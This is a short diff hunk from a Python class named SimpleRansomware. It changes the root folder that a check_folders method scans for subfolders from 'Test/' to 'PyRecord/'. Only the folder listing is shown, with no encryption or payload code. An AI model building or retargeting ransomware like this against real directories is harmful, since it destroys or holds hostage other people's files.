@@ -43,7 +43,7 @@ class SimpleRansomware:
     def check_folders(self):
         """ Verifica as subpastas na pasta raiz indicada """
         folders = []
-        self.path = Path('Test/')
+        self.path = Path('PyRecord/')
 
         for item in self.path.iterdir():
             if item.is_dir():
